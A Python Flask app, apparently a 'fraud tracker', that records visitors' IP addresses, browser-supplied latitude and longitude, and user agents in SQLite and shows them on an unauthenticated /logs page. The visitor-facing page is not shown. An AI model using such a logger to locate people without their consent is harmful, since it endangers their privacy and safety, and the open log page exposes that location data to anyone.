from flask import Flask, request, jsonify, render_template, make_response
import sqlite3
import datetime

app = Flask(__name__)

def init_db():
    conn = sqlite3.connect("fraud_tracker.db")
    cursor = conn.cursor()
    cursor.execute('''CREATE TABLE IF NOT EXISTS logs (
                        id INTEGER PRIMARY KEY AUTOINCREMENT,
                        ip TEXT,
                        latitude TEXT,
                        longitude TEXT,
                        user_agent TEXT,
                        timestamp TEXT)''')
    conn.commit()
    conn.close()

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/track', methods=['POST'])
def track():

    response = make_response(jsonify({"status": "sucesso", "message": "Dados registrados"}), 200)
    response.headers['Cache-Control'] = 'no-store'
    response.headers['Pragma'] = 'no-cache'
    response.headers['Expires'] = '0'

    data = request.json
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    latitude = data.get('latitude', 'Desconhecido')
    longitude = data.get('longitude', 'Desconhecido')
    user_agent = data.get('userAgent', 'Desconhecido')
    timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    print(f"Dados recebidos: IP={ip}, Latitude={latitude}, Longitude={longitude}, User Agent={user_agent}, Timestamp={timestamp}")

    conn = sqlite3.connect("fraud_tracker.db")
    cursor = conn.cursor()
    cursor.execute("INSERT INTO logs (ip, latitude, longitude, user_agent, timestamp) VALUES (?, ?, ?, ?, ?)",
                   (ip, latitude, longitude, user_agent, timestamp))
    conn.commit()
    conn.close()

    return response


@app.route('/logs')
def view_logs():
    conn = sqlite3.connect("fraud_tracker.db")
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM logs")
    logs = cursor.fetchall() 
    conn.close()

    return render_template('logs.html', logs=logs)

if __name__ == '__main__':
    init_db()
    app.run(host='0.0.0.0', port=10000)
